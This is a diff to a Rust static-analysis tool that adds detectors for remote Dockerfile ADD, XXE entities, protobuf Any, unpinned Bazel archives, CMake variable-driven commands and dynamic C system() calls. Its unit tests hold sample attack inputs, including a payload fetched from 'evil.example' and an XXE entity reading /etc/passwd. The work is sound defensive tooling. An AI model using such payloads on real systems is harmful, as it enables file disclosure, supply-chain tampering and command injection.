@@ -10,7 +10,13 @@
 //! |----------|---------|-------------|
 //! | YAML | Wildcard Kubernetes host | `VirtualService`/`Ingress` with `hosts: ["*"]` — exposes all routes publicly |
 //! | C/C++ | `gets()`, `strcpy()`, `sprintf()`, `scanf()` calls | Removed in C11 or known buffer-overflow sources |
+//! | C/C++ | `system(${dynamic})` | Shell execution with non-literal input enables command injection |
 //! | C/C++ | `strcpy()` / `sprintf()` / `scanf()` | Unsafe string functions (CERT-C) |
+//! | Dockerfile | `ADD https://...` | Remote fetch during image build bypasses provenance pinning and mirrors |
+//! | XML | `<!DOCTYPE ... <!ENTITY ... SYSTEM|PUBLIC ...>` | External entity expansion (XXE) enables SSRF/file disclosure |
+//! | Proto | `google.protobuf.Any` | Type-erased message ingestion widens deserialization attack surface |
+//! | Bazel/Starlark | `http_archive(...)` without `sha256` | Unpinned remote fetch enables supply-chain substitution |
+//! | CMake | `execute_process(COMMAND ${VAR})` | Variable-driven command execution enables search-path / command injection |
 //! | HCL/Terraform | Open CIDR `0.0.0.0/0` | Wildcard ingress rule exposes resource to the entire internet |
 //! | HCL/Terraform | `public-read` S3 ACL | Public S3 bucket exposes data to the internet |
 //! | Python | `subprocess` with `shell=True` | Potential shell injection when combined with string concatenation |
@@ -334,6 +340,11 @@ pub fn find_slop(language: &str, source: &[u8]) -> Vec<SlopFinding> {
     };
 
     let mut findings = match language {
+        "dockerfile" => find_dockerfile_slop(source),
+        "xml" => find_xml_slop(source),
+        "proto" => find_proto_slop(source),
+        "bzl" | "bazel" | "starlark" => find_starlark_slop(source),
+        "cmake" => find_cmake_slop(source),
         "yaml" | "yml" => find_yaml_slop(eng, source),
         "c" | "h" => find_c_slop(eng, source),
         "cpp" | "cxx" | "cc" | "hpp" => find_cpp_slop(eng, source),
@@ -409,6 +420,163 @@ pub fn find_slop(language: &str, source: &[u8]) -> Vec<SlopFinding> {
     // Catches external script loading without SRI and GitHub Pages URL embedding.
     findings.extend(find_supply_chain_slop(source));
     findings
+}
+
+fn ascii_lower(source: &[u8]) -> Vec<u8> {
+    source.iter().map(u8::to_ascii_lowercase).collect()
+}
+
+fn find_dockerfile_slop(source: &[u8]) -> Vec<SlopFinding> {
+    let lower = ascii_lower(source);
+    let mut findings = Vec::new();
+    for (offset, line) in lower.split(|&b| b == b'\n').enumerate() {
+        let _ = offset;
+        let trimmed = trim_ascii_start(line);
+        if trimmed.starts_with(b"add http://") || trimmed.starts_with(b"add https://") {
+            let start = line_offset(&lower, line.as_ptr() as usize - lower.as_ptr() as usize);
+            findings.push(SlopFinding {
+                start_byte: start,
+                end_byte: start + line.len(),
+                description: "security:docker_remote_add — Dockerfile `ADD` pulls a remote URL during build; this bypasses artifact pinning and allows upstream mirror substitution. Prefer a pinned download with explicit digest verification.".to_string(),
+                domain: DOMAIN_ALL,
+                severity: Severity::Critical,
+            });
+        }
+    }
+    findings
+}
+
+fn find_xml_slop(source: &[u8]) -> Vec<SlopFinding> {
+    let lower = ascii_lower(source);
+    let has_doctype = lower.windows(b"<!doctype".len()).any(|w| w == b"<!doctype");
+    let has_entity = lower.windows(b"<!entity".len()).any(|w| w == b"<!entity");
+    let has_external = lower.windows(b"system".len()).any(|w| w == b"system")
+        || lower.windows(b"public".len()).any(|w| w == b"public");
+    if has_doctype && has_entity && has_external {
+        vec![SlopFinding {
+            start_byte: lower
+                .windows(b"<!doctype".len())
+                .position(|w| w == b"<!doctype")
+                .unwrap_or(0),
+            end_byte: source.len(),
+            description: "security:xml_xxe — XML document declares an external entity via `DOCTYPE`/`ENTITY` with `SYSTEM` or `PUBLIC`; this is an XXE primitive that can trigger SSRF or local file disclosure.".to_string(),
+            domain: DOMAIN_ALL,
+            severity: Severity::Critical,
+        }]
+    } else {
+        Vec::new()
+    }
+}
+
+fn find_proto_slop(source: &[u8]) -> Vec<SlopFinding> {
+    if let Some(start) = source
+        .windows(b"google.protobuf.Any".len())
+        .position(|w| w == b"google.protobuf.Any")
+    {
+        vec![SlopFinding {
+            start_byte: start,
+            end_byte: start + "google.protobuf.Any".len(),
+            description: "security:proto_type_erasure — `google.protobuf.Any` introduces type-erased message ingestion; without an allowlisted unpack boundary it widens deserialization and privilege-confusion attack surface.".to_string(),
+            domain: DOMAIN_FIRST_PARTY,
+            severity: Severity::Critical,
+        }]
+    } else {
+        Vec::new()
+    }
+}
+
+fn find_starlark_slop(source: &[u8]) -> Vec<SlopFinding> {
+    let lower = ascii_lower(source);
+    let mut findings = Vec::new();
+    for rule in [b"http_archive(".as_slice(), b"http_file(".as_slice()] {
+        let mut search_start = 0;
+        while let Some(rel) = lower[search_start..]
+            .windows(rule.len())
+            .position(|w| w == rule)
+        {
+            let start = search_start + rel;
+            let end = find_matching_paren(&lower, start + rule.len() - 1).unwrap_or(lower.len());
+            let block = &lower[start..end];
+            let has_url = block.windows(b"urls".len()).any(|w| w == b"urls")
+                || block.windows(b"url".len()).any(|w| w == b"url");
+            let has_sha = block.windows(b"sha256".len()).any(|w| w == b"sha256");
+            if has_url && !has_sha {
+                findings.push(SlopFinding {
+                    start_byte: start,
+                    end_byte: end,
+                    description: "security:bazel_unpinned_http_archive — Bazel/Starlark remote fetch rule declares a URL without `sha256`; this permits supply-chain substitution or mirror tampering during repository resolution.".to_string(),
+                    domain: DOMAIN_ALL,
+                    severity: Severity::Critical,
+                });
+            }
+            search_start = end.min(lower.len());
+        }
+    }
+    findings
+}
+
+fn find_cmake_slop(source: &[u8]) -> Vec<SlopFinding> {
+    let lower = ascii_lower(source);
+    let mut findings = Vec::new();
+    let needle = b"execute_process(";
+    let mut search_start = 0;
+    while let Some(rel) = lower[search_start..]
+        .windows(needle.len())
+        .position(|w| w == needle)
+    {
+        let start = search_start + rel;
+        let end = find_matching_paren(&lower, start + needle.len() - 1).unwrap_or(lower.len());
+        let block = &lower[start..end];
+        let dynamic_command = block
+            .windows(b"command ${".len())
+            .any(|w| w == b"command ${")
+            || block
+                .windows(b"command \"${".len())
+                .any(|w| w == b"command \"${")
+            || block
+                .windows(b"command ${".len())
+                .any(|w| w == b"command ${");
+        if dynamic_command {
+            findings.push(SlopFinding {
+                start_byte: start,
+                end_byte: end,
+                description: "security:cmake_execute_process_injection — `execute_process(COMMAND ${...})` executes a variable-controlled command; this enables search-path hijack or command injection through cache/environment mutation.".to_string(),
+                domain: DOMAIN_FIRST_PARTY,
+                severity: Severity::Critical,
+            });
+        }
+        search_start = end.min(lower.len());
+    }
+    findings
+}
+
+fn trim_ascii_start(line: &[u8]) -> &[u8] {
+    let first = line
+        .iter()
+        .position(|b| !b.is_ascii_whitespace())
+        .unwrap_or(line.len());
+    &line[first..]
+}
+
+fn line_offset(haystack: &[u8], relative: usize) -> usize {
+    relative.min(haystack.len())
+}
+
+fn find_matching_paren(source: &[u8], open_idx: usize) -> Option<usize> {
+    let mut depth = 0_u32;
+    for (idx, byte) in source.iter().enumerate().skip(open_idx) {
+        match *byte {
+            b'(' => depth = depth.saturating_add(1),
+            b')' => {
+                depth = depth.saturating_sub(1);
+                if depth == 0 {
+                    return Some(idx + 1);
+                }
+            }
+            _ => {}
+        }
+    }
+    None
 }
 
 // ---------------------------------------------------------------------------
@@ -630,11 +798,18 @@ fn find_wildcard_in_sequence(
 /// Detect calls to dangerous libc functions in C/C-header source.
 ///
 /// Banned functions: `gets` (removed in C11), `strcpy` (unbounded copy),
-/// `sprintf` (unbounded format write), `scanf` (unbounded input read).
+/// `sprintf` (unbounded format write), `scanf` (unbounded input read), and
+/// `system` with a non-literal argument (command injection primitive).
 fn find_c_slop(eng: &QueryEngine, source: &[u8]) -> Vec<SlopFinding> {
-    let has_banned = [b"gets".as_slice(), b"strcpy", b"sprintf", b"scanf"]
-        .iter()
-        .any(|pat| source.windows(pat.len()).any(|w| w == *pat));
+    let has_banned = [
+        b"gets".as_slice(),
+        b"strcpy",
+        b"sprintf",
+        b"scanf",
+        b"system",
+    ]
+    .iter()
+    .any(|pat| source.windows(pat.len()).any(|w| w == *pat));
     if !has_banned {
         return Vec::new();
     }
@@ -667,6 +842,7 @@ fn find_cpp_slop(eng: &QueryEngine, source: &[u8]) -> Vec<SlopFinding> {
 /// - `strcpy`  → `strncpy` or `strlcpy` (unbounded buffer copy)
 /// - `sprintf` → `snprintf` (unbounded format write)
 /// - `scanf`   → `fgets` + `sscanf` with explicit width (unbounded input read)
+/// - `system`  → `execve`/`posix_spawn` with explicit argv allowlisting
 fn find_banned_c_calls(node: Node<'_>, source: &[u8], findings: &mut Vec<SlopFinding>) {
     if node.kind() == "call_expression" {
         if let Some(func) = node.child_by_field_name("function") {
@@ -689,6 +865,11 @@ fn find_banned_c_calls(node: Node<'_>, source: &[u8], findings: &mut Vec<SlopFin
                             "security:unsafe_string_function — scanf(): unbounded input \
                              read — use fgets + sscanf with explicit field width",
                         ),
+                        "system" if c_system_call_is_dynamic(node, source) => Some(
+                            "security:os_command_injection — system(): executes a shell \
+                             command from a non-literal argument; route through execve/posix_spawn \
+                             with an explicit argv allowlist to avoid command injection",
+                        ),
                         _ => None,
                     };
                     if let Some(d) = desc {
@@ -709,6 +890,16 @@ fn find_banned_c_calls(node: Node<'_>, source: &[u8], findings: &mut Vec<SlopFin
     for child in node.children(&mut cursor) {
         find_banned_c_calls(child, source, findings);
     }
+}
+
+fn c_system_call_is_dynamic(node: Node<'_>, source: &[u8]) -> bool {
+    let Ok(call_src) = node.utf8_text(source) else {
+        return false;
+    };
+    let compact: String = call_src.chars().filter(|c| !c.is_whitespace()).collect();
+    compact.starts_with("system(")
+        && !compact.starts_with("system(\"")
+        && !compact.starts_with("system('")
 }
 
 // ---------------------------------------------------------------------------
@@ -7390,6 +7581,126 @@ mod phase7_rd_tests {
                 .iter()
                 .any(|f| f.description.contains("react_xss_dangerous_html")),
             "find_slop(jsx) must dispatch to Phase 7 JSX dangerous HTML walk"
+        );
+    }
+
+    #[test]
+    fn test_find_slop_dispatches_dockerfile_remote_add() {
+        let src = b"FROM alpine:3.20\nADD https://evil.example/payload.tgz /tmp/payload.tgz\n";
+        let findings = find_slop("dockerfile", src);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.description.contains("docker_remote_add")),
+            "find_slop(dockerfile) must dispatch to Docker remote ADD detector"
+        );
+    }
+
+    #[test]
+    fn test_dockerfile_copy_clean() {
+        let src = b"FROM alpine:3.20\nCOPY ./payload.tgz /tmp/payload.tgz\n";
+        let findings = find_slop("dockerfile", src);
+        assert!(findings.is_empty(), "Dockerfile COPY must stay clean");
+    }
+
+    #[test]
+    fn test_find_slop_dispatches_xml_xxe() {
+        let src = br#"<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+"#;
+        let findings = find_slop("xml", src);
+        assert!(
+            findings.iter().any(|f| f.description.contains("xml_xxe")),
+            "find_slop(xml) must dispatch to XXE detector"
+        );
+    }
+
+    #[test]
+    fn test_xml_plain_document_clean() {
+        let findings = find_slop("xml", br#"<?xml version="1.0"?><foo>safe</foo>"#);
+        assert!(findings.is_empty(), "plain XML must stay clean");
+    }
+
+    #[test]
+    fn test_find_slop_dispatches_proto_any() {
+        let src = b"syntax = \"proto3\";\nimport \"google/protobuf/any.proto\";\nmessage Envelope { google.protobuf.Any payload = 1; }\n";
+        let findings = find_slop("proto", src);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.description.contains("proto_type_erasure")),
+            "find_slop(proto) must dispatch to google.protobuf.Any detector"
+        );
+    }
+
+    #[test]
+    fn test_proto_typed_message_clean() {
+        let src = b"syntax = \"proto3\";\nmessage Payload { string value = 1; }\nmessage Envelope { Payload payload = 1; }\n";
+        let findings = find_slop("proto", src);
+        assert!(findings.is_empty(), "typed protobuf fields must stay clean");
+    }
+
+    #[test]
+    fn test_find_slop_dispatches_bazel_http_archive() {
+        let src = b"http_archive(\n    name = \"rules_foo\",\n    urls = [\"https://example.com/rules_foo.tar.gz\"],\n)\n";
+        let findings = find_slop("bzl", src);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.description.contains("bazel_unpinned_http_archive")),
+            "find_slop(bzl) must dispatch to unpinned http_archive detector"
+        );
+    }
+
+    #[test]
+    fn test_bazel_http_archive_pinned_clean() {
+        let src = b"http_archive(\n    name = \"rules_foo\",\n    urls = [\"https://example.com/rules_foo.tar.gz\"],\n    sha256 = \"abc123\",\n)\n";
+        let findings = find_slop("bzl", src);
+        assert!(findings.is_empty(), "pinned Bazel archive must stay clean");
+    }
+
+    #[test]
+    fn test_find_slop_dispatches_cmake_execute_process() {
+        let src =
+            b"set(USER_CMD ${ENV{PAYLOAD}})\nexecute_process(COMMAND ${USER_CMD} OUTPUT_VARIABLE out)\n";
+        let findings = find_slop("cmake", src);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.description.contains("cmake_execute_process_injection")),
+            "find_slop(cmake) must dispatch to execute_process injection detector"
+        );
+    }
+
+    #[test]
+    fn test_cmake_literal_execute_process_clean() {
+        let src = b"execute_process(COMMAND /usr/bin/git rev-parse HEAD OUTPUT_VARIABLE out)\n";
+        let findings = find_slop("cmake", src);
+        assert!(findings.is_empty(), "literal CMake command must stay clean");
+    }
+
+    #[test]
+    fn test_c_system_dynamic_arg_detected() {
+        let src = b"#include <stdlib.h>\nvoid f(char *cmd) { system(cmd); }\n";
+        let findings = find_slop("c", src);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.description.contains("os_command_injection")),
+            "system(dynamic) must fire os_command_injection"
+        );
+    }
+
+    #[test]
+    fn test_c_system_literal_arg_clean() {
+        let src = b"#include <stdlib.h>\nvoid f() { system(\"/usr/bin/id\"); }\n";
+        let findings = find_slop("c", src);
+        assert!(
+            findings
+                .iter()
+                .all(|f| !f.description.contains("os_command_injection")),
+            "system(literal) must not fire dynamic injection rule"
         );
     }
 }
